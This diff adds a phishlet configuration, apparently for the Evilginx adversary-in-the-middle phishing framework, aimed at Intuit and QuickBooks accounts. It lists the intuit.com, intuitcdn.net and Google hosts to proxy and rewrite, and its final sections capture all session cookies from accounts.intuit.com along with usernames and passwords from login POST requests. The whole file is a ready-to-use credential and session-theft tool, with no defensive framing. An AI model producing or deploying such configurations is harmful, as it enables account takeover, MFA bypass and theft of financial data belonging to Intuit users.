@@ -1,0 +1,79 @@
+author: '@an0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+    - {phish_sub: 'www', orig_sub: 'www', domain: 'intuit.com', session: true, is_landing: false}
+    - {phish_sub: '', orig_sub: '', domain: 'intuit.com', session: true, is_landing: false}    
+    - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'intuit.com', session: true, is_landing: true}
+    - {phish_sub: 'quickbooks', orig_sub: 'quickbooks', domain: 'intuit.com', session: false, is_landing: false}
+    - {phish_sub: 'qbo', orig_sub: 'qbo', domain: 'intuit.com', session: false, is_landing: false}
+    - {phish_sub: 'lacerte', orig_sub: 'lacerte', domain: 'intuit.com', session: false, is_landing: false}    
+    - {phish_sub: 'intuitmarket', orig_sub: 'intuitmarket', domain: 'intuit.com', session: false, is_landing: false}
+    - {phish_sub: 'appfabric-preload', orig_sub: 'appfabric-preload', domain: 'intuit.com', session: false, is_landing: false}	
+    - {phish_sub: 'eventbus', orig_sub: 'eventbus', domain: 'intuit.com', session: false, is_landing: false}
+    - {phish_sub: 'rum', orig_sub: 'rum', domain: 'intuit.com', session: false, is_landing: false}    
+    - {phish_sub: 'lib', orig_sub: 'lib', domain: 'intuitcdn.net', session: false, is_landing: false}
+    - {phish_sub: 'plugin', orig_sub: 'plugin', domain: 'intuitcdn.net', session: false, is_landing: false}
+    - {phish_sub: 'uxfabric', orig_sub: 'uxfabric', domain: 'intuitcdn.net', session: false, is_landing: false}
+    - {phish_sub: 'segment', orig_sub: 'segment', domain: 'intuitcdn.net', session: false, is_landing: false}
+    - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'intuit.com', session: false, is_landing: false}
+    - {phish_sub: 'trinity', orig_sub: 'trinity', domain: 'intuit.com', session: false, is_landing: false}    
+    - {phish_sub: 'uxfabric', orig_sub: 'uxfabric', domain: 'intuitcdn.net', session: false, is_landing: false}
+    - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+    - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false}    
+
+# www.gstatic.com
+# www.google.com
+# accounts.intuit.com
+# appfabric-preload.app.intuit.com
+# lib.intuitcdn.net
+# plugin.intuitcdn.net
+# segment.intuitcdn.net
+# qbo.intuit.com
+# lacerte.intuit.com
+# intuitmarket.intuit.com
+# 
+
+
+# uxfabric.intuitcdn.net
+# trinity.platform.intuit.com
+# www.intuit.com
+# quickbooks.intuit.com
+# segment.intuitcdn.net
+# rum.api.intuit.com
+# intuit.com
+# eventbus.intuit.com
+# cdn.websdk.intuit.com
+# 
+  
+sub_filters:
+    - {triggers_on: 'www.intuit.com', orig_sub: 'www', domain: 'intuit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'quickbooks.intuit.com', orig_sub: 'quickbooks', domain: 'intuit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'qbo.intuit.com', orig_sub: 'qbo', domain: 'intuit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'intuitmarket.intuit.com', orig_sub: 'intuitmarket', domain: 'intuit.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'lacerte.intuit.com', orig_sub: 'lacerte', domain: 'intuit.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'rum.intuit.com', orig_sub: 'rum', domain: 'intuit.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'accounts.intuit.com', orig_sub: 'accounts', domain: 'intuit.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'appfabric-preload.intuit.com', orig_sub: 'appfabric-preload', domain: 'intuit.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'eventbus.intuit.com', orig_sub: 'eventbus', domain: 'intuit.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'trinity.intuit.com', orig_sub: 'trinity', domain: 'intuit.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ 
+
+auth_tokens:
+  - domain: 'accounts.intuit.com'
+    keys: [".*,regexp"]
+credentials:
+    username:
+     key: '(username|USERNAME|identifier|Username|Identifier)'
+     search: '(.*)'
+     type: 'post'
+    password:
+     key: '(password|PASSWORD)'
+     search: '(.*)'
+     type: 'post'
+auth_urls:
+  - '/app'
+  - '/app/'
+login:
+  domain: 'accounts.intuit.com'
+  path: '/index.html'
